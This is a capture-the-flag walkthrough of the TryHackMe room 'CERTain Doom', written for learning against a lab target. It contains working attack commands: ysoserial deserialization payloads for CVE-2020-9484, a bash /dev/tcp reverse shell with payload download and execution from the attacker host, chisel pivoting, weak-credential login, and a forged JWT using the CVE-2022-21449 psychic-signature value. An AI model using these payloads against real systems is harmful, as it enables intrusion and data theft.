---
title: "TryHackMe: CERTain Doom"
author: jaxafed
categories: [TryHackMe]
tags: [web, java, insecure deserialization, ysoserial, pivoting, weak credentials, api, jwt]
render_with_liquid: false
media_subpath: /images/tryhackme_certain_doom/
image:
  path: room_image.webp
---

CERTain Doom began by discovering an arbitrary file upload vulnerability and combining it with `CVE-2020-9484` to gain a shell within a container, which led to obtaining the first flag. 

Using the container to scan for internal hosts, we identified two hosts and an internal service with one running the front-end and one running the back-end for it. The service manages documents and by logging into it with predictable credentials, we found a chat log and downloading it, discovered the second flag.

After that, using the `psychic signatures` vulnerability to forge a `JWT` for another user, we discovered a hidden file belonging to the user and downloading it, we obtained the third flag.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/certaindoom){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.137.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 12:47 UTC
Nmap scan report for 10.10.137.26
Host is up (0.14s latency).
Not shown: 65103 filtered tcp ports (no-response), 429 filtered tcp ports (admin-prohibited)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:69:84:5c:69:01:42:2d:da:01:3e:13:a6:db:2f:c3 (RSA)
|   256 cc:55:d5:72:1d:be:03:85:d5:7e:3e:1a:d6:72:2c:2c (ECDSA)
|_  256 08:34:3b:e0:5d:d1:37:d4:68:28:6b:cf:e2:f1:53:ed (ED25519)
80/tcp   open  http       hastatic-1.0.0
|_http-title: Super Secret Admin Page
|_http-server-header: hastatic-1.0.0
...
8080/tcp open  http-proxy Apache Tomcat 9?
|_http-server-header: Apache Tomcat 9?
|_http-title: HTTP Status 404 \xE2\x80\x93 Not Found
...
```

There are three ports open:

- 22/SSH
- 80/HTTP
- 8080/HTTP

### WEB 80

On visiting `http://10.10.137.26/`, we don't see anything useful.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

The server header indicates that it uses `Hastatic`.

### WEB 8080

Visiting `http://10.10.137.26:8080/`, we receive a `404` page.

![Web 8080 Index](web_8080_index.webp){: width="1200" height="500" }

The server header indicates that it runs `Apache Tomcat`, which is more promising.

## First Flag

### Discovering the reports

Fuzzing `http://10.10.137.26:8080/` for directories, we discover the `/reports/` endpoint.

```console
$ ffuf -u 'http://10.10.137.26:8080/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
reports                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 125ms]
```
{: .wrap }

At `http://10.10.137.26:8080/reports/`, we see a page about reporting vulnerabilities with a file upload form.

![Web 8080 Reports](web_8080_reports.webp){: width="1200" height="600" }

While the application instructs us to upload only `PDF` files, we are able to upload any file type.

Additionally, after the upload, the application reveals the path to the uploaded file.

![Web 8080 Reports Upload](web_8080_reports_upload.webp){: width="1200" height="500" }

### CVE-2020-9484

Searching for potential attack vectors, we encounter `CVE-2020-9484`. This vulnerability occurs when a server is configured to use file-based storage for sessions. In this configuration, session data is saved in a file in a serialized format and deserialized when needed. Since we can upload arbitrary files and know their paths on the server, we can upload a serialized payload that executes a command upon deserialization. Also, by using a path traversal payload in the `JSESSIONID` cookie, we can force the server to deserialize our uploaded payload and execute commands.

Creating our reverse shell payload and starting a `HTTP` server to serve it.

```console
$ cat index.html
/bin/bash -i >& /dev/tcp/10.11.72.22/443 0>&1

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Creating the serialized payload to download our reverse shell using `ysoserial`.

> You need to use `Java 11` for this.
{: .prompt-tip }

```console
$ ysoserial.jar CommonsCollections2 'curl 10.11.72.22 -o /tmp/rev.sh' > payload.session
```

After uploading our payload, we can see that it is located at `/usr/local/tomcat/temp/uploads/payload.session`.

![Web 8080 Reports Upload Payload](web_8080_reports_upload_payload.webp){: width="1200" height="300" }

Now, making a request with a directory traversal payload in the `JSESSIONID` cookie to point to the file we uploaded.

```console
$ curl -s 'http://10.10.137.26:8080/reports/' -H "Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/payload"
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1></body></html>
```
{: .wrap }

Upon making the request, we can see that our payload is being downloaded.

```console
10.10.137.26 - - [16/Sep/2024 13:40:02] "GET / HTTP/1.1" 200 -
```

Now creating another payload, this time for executing the downloaded reverse shell payload.

```console
$ ysoserial.jar CommonsCollections2 'bash /tmp/rev.sh' > payload2.session
```

Uploading and calling it the same way as before.

```console
$ curl -s 'http://10.10.137.26:8080/reports/' -H "Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/payload2"
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1></body></html>
```
{: .wrap }

With this, we obtain a shell and are able to read the first flag.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.137.26] 54068
bash: no job control in this shell
bash-4.2# wc -c .flag
38 .flag
```

## Second Flag

After uploading `nmap` and scanning for other containers, we discover `cert_library_1.cert_cert-internal` and `cert_library-back_1.cert_cert-internal` in the `172.20.0.0/24` range.

```console
bash-4.2# curl http://10.11.72.22/nmap -o nmap
bash-4.2# chmod +x nmap
bash-4.2# ./nmap -sn 172.20.0.0/24
...
Nmap scan report for cert_library_1.cert_cert-internal (172.20.0.2)
Host is up (0.000013s latency).
MAC Address: 02:42:AC:14:00:02 (Unknown)
Nmap scan report for cert_library-back_1.cert_cert-internal (172.20.0.3)
Host is up (0.000028s latency).
MAC Address: 02:42:AC:14:00:03 (Unknown)
...
```

Scanning these hosts for open ports, we find that port `80` is open on `172.20.0.2` and port `8080` is open on `172.20.0.3`.

```console
bash-4.2# ./nmap -p- --min-rate 5000 172.20.0.2
...
PORT   STATE SERVICE
80/tcp open  http

bash-4.2# ./nmap -p- --min-rate 5000 172.20.0.3
...
PORT     STATE SERVICE
8080/tcp open  webcache
```

Using `chisel` to establish a `socks` tunnel to access the hosts.

First, starting the `chisel` server on our machine.

```console
$ ./chisel server -p 9999 --socks5 --reverse
```

Uploading `chisel` to the container and running it in client mode.

```console
bash-4.2# curl http://10.11.72.22/chisel -o chisel
bash-4.2# chmod +x chisel
bash-4.2# ./chisel client 10.11.72.22:9999 R:socks &
```

Now, with the `socks` tunnel established, setting the `Burp` to use it as such:

![Burp Proxy Setting](burp_proxy_setting.webp){: width="1200" height="400" }

After this, visiting `http://172.20.0.2/`, we see the `Documents Library` application.

![Library Front-End Index](library_frontend_index.webp){: width="1200" height="600" }

Also, by checking the requests it makes, we see it tries to request `http://library-back:8080/documents`, which is likely the other host we discovered (`172.20.0.3`).

![Library Back-End Request](library_backend_request.webp){: width="1000" height="400" }

Adding `library-back` to our `hosts` file.

```
172.20.0.3 library-back
```
{: file="/etc/hosts" }

After refreshing the page, we see that this time it is able to make the request, but the back-end returns `CORS Rejected - Invalid origin`.

![Library Back-End Request CORS](library_backend_request_cors.webp){: width="1000" height="400" }

Trying a couple of different origins, we are successful with `library`.

![Library Back-End Request Origin](library_backend_request_origin.webp){: width="1000" height="400" }

Adding `172.20.0.2` to our hosts file as `library` and visiting the application as such.

```
172.20.0.2 library
```
{: file="/etc/hosts" }

This time, after the request to `http://library-back:8080/documents`, a login form is displayed.

![Library Front-End Login](library_frontend_login.webp){: width="1200" height="600" }

Testing the form, we see it makes a login request to `http://library-back:8080/j_security_check`.

![Library Back-End Login Request](library_backend_login_request.webp){: width="1000" height="400" }

After trying a few basic credentials, we successfully login with `bob:bob`, and the server returns the `credz` cookie.

![Library Back-End Login](library_backend_login.webp){: width="1000" height="500" }

Now that we are logged in, we examine `http://library/build/p-dc627381.entry.js` to understand how the application works.

![Library Front-End JS](library_frontend_js.webp){: width="1000" height="500" }

It makes a request to `http://library-back:8080/documents` with `name`, `author`, and `hidden` parameters to search for documents and a request to `http://library-back:8080/documents/download/<filename>` to download files.

Using the cookie we obtained and searching for documents, we find only one.

![Library Back-End Files](library_backend_files.webp){: width="1000" height="500" }

However, using the `hidden=true` argument to search for hidden files, we discover two more.

![Library Back-End Hidden Files](library_backend_hidden_files.webp){: width="1000" height="500" }

Downloading the `chat.log` file, we obtain the second flag.

![Library Back-End Second Flag](library_backend_second_flag.webp){: width="1000" height="500" }

## Third Flag

Looking back at the conversation, we discover another username in the `chat.log` file besides `bob`: `hydra`.

Searching for files belonging to the user, we find `flagz.docx`, but it does not contain anything useful.

![Library Back-End Hydras Files](library_backend_hydras_files.webp){: width="1000" height="500" }

Trying to find any hidden files belonging to the `hydra` user, we only get the hidden files belonging to the current user.

![Library Back-End Hydras Hidden Files](library_backend_hydras_hidden_files.webp){: width="1000" height="500" }

Apart from the flag, `chat.log` also includes an interesting snippet:

```console
[2023-08-08 18:53] Bob: Hey do you have the specs for the tokens?
[2023-08-08 18:53] Hydra: It's a standard JWT, no?
[2023-08-08 18:54] Bob: Yeah, but what claims should we use?
[2023-08-08 18:54] Hydra: Just use the standard framework auth.
[2023-08-08 18:55] Hydra: Oh right, the algorithm you're using has a major vulnerability though, you might want to update that or at least patch your Java.
```
{: .wrap }

It mentions using `JWTs` for authentication and notes that the algorithm used is vulnerable.

With some research, we conclude that the vulnerable algorithm is likely `ECDSA` and the vulnerability is `CVE-2022-21449: Psychic Signatures`, which allows us to bypass signature checks. This means we can put any claims we want on the `JWT`, and using the payload for the `psychic signature` vulnerability as the signature for the token, the application will accept it as valid.

The problem now is determining what claims to use in our token. From the conversation, we infer that the `standard framework auth` used for the claims, and with the hint in the room, we can identify the framework as `Quarkus`.

Checking the example token in the documentation and modifying it for our case, we end up with something like `{"sub": "hydra", "iss": "library-back", "groups": [""], "exp": 2000000000, "iat": 1000000000, "jti": "a-123"}` for our claims.

Using these to create a token as such:

- Header: `{"typ": "JWT", "alg": "ES256"}` -> `eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9`
- Payload: `{"sub": "hydra", "iss": "library-back", "groups": [""], "exp": 2000000000, "iat": 1000000000, "jti": "a-123"}` -> `eyJzdWIiOiAiaHlkcmEiLCAiaXNzIjogImxpYnJhcnktYmFjayIsICJncm91cHMiOiBbIiJdLCAiZXhwIjogMjAwMDAwMDAwMCwgImlhdCI6IDEwMDAwMDAwMDAsICJqdGkiOiAiYS0xMjMifQ`

Now, the signature part of the JWT.

First, if we try an invalid signature, it results in a `401 Unauthorized` response.

![Library Back-End Invalid Token](library_backend_invalid_token.webp){: width="1000" height="500" }

But using the `psychic signature` payload (`MAYCAQACAQA`) as the signature for our token results in a `403 Forbidden` response.

This indicates that our token works, but we are likely missing a valid claim.

After many trials and errors, we succeeded by adding `user` to the groups.

- Header: `{"typ": "JWT", "alg": "ES256"}` -> `eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9`
- Payload: `{"sub": "hydra", "iss": "library-back", "groups": ["user"], "exp": 2000000000, "iat": 1000000000, "jti": "a-123"}` -> `eyJzdWIiOiAiaHlkcmEiLCAiaXNzIjogImxpYnJhcnktYmFjayIsICJncm91cHMiOiBbInVzZXIiXSwgImV4cCI6IDIwMDAwMDAwMDAsICJpYXQiOiAxMDAwMDAwMDAwLCAianRpIjogImEtMTIzIn0`
- Signature: `MAYCAQACAQA`

Creating a token with these, we successfully authenticate and can list the documents.

![Library Back-End Valid Token](library_backend_valid_token.webp){: width="1000" height="500" }

With a valid token, listing the hidden files belonging to the user reveals `specs.pdf`.

![Library Back-End Hydras Hidden Files Two](library_backend_hydras_hidden_files2.webp){: width="1000" height="500" }

Using `curl` with `proxychains`, we can download the file as follows:

```console
$ proxychains -q curl -s 'http://library-back:8080/documents/download/specs.pdf' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiAiaHlkcmEiLCAiaXNzIjogImxpYnJhcnktYmFjayIsICJncm91cHMiOiBbInVzZXIiXSwgImV4cCI6IDIwMDAwMDAwMDAsICJpYXQiOiAxMDAwMDAwMDAwLCAianRpIjogImEtMTIzIn0.MAYCAQACAQA' -o specs.pdf
```
{: .wrap }

Opening the `PDF` does not reveal the flag, but using `pdftotext` to extract all the text from the `PDF`, we find the third flag along with a fake one.

```console
$ pdftotext specs.pdf specs.txt

$ grep 'THM' specs.txt
THM{[REDACTED]}
The flag for today is THM{This_is_not_the_real_flag_try_again}
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
